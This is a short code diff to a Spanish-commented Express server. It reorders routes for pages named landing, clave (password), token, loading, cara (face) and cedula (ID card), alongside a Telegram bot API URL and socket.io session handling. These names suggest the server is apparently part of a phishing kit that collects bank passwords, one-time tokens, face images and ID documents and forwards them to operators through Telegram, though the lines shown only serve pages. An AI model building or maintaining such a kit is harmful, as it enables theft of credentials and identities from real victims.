@@ -23,6 +23,39 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 // Middleware
 app.use(cors());
 app.use(express.json());
+
+// Rutas específicas ANTES del middleware estático
+app.get('/', (req, res) => {
+  console.log('[RUTA] GET / -> Sirviendo landing.html');
+  res.sendFile(path.join(__dirname, 'landing.html'));
+});
+
+app.get('/index.html', (req, res) => {
+  console.log('[RUTA] GET /index.html -> Sirviendo index.html');
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/clave.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'clave.html'));
+});
+
+app.get('/token.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'token.html'));
+});
+
+app.get('/loading.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'loading.html'));
+});
+
+app.get('/cara.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'cara.html'));
+});
+
+app.get('/cedula.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'cedula.html'));
+});
+
+// Middleware estático DESPUÉS de las rutas específicas
 app.use(express.static(path.join(__dirname)));
 
 // Almacenamiento temporal de sesiones
@@ -465,35 +498,6 @@ io.on('connection', (socket) => {
     // Solo actualizamos el mapeo
     sessionIdMap.delete(sessionId);
   });
-});
-
-// Rutas estáticas
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'landing.html'));
-});
-
-app.get('/index.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.get('/clave.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'clave.html'));
-});
-
-app.get('/token.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'token.html'));
-});
-
-app.get('/loading.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'loading.html'));
-});
-
-app.get('/cara.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'cara.html'));
-});
-
-app.get('/cedula.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'cedula.html'));
 });
 
 // Endpoint de salud
